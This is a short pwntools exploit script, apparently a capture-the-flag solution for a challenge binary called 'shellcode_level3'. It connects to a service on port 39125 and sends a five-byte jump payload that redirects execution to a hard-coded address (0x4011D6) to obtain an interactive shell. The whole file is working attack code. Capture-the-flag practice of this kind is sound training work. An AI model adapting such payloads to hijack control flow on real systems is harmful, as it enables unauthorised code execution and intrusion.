from pwn import *

context(log_level = "debug",arch = "amd64",os = "linux")
p = remote("0.0.0.0", 39125)
#p=process("./shellcode_level3")#4011D6
shell=p8(0xE9)+p8(0x48)+p8(0xD1)+p8(0xFF)+p8(0xFF)#404089 ->4011D6
#e9 d1 1d 01 04
p.sendlineafter("5 bytes ni neng miao sha wo?",shell)

p.interactive()

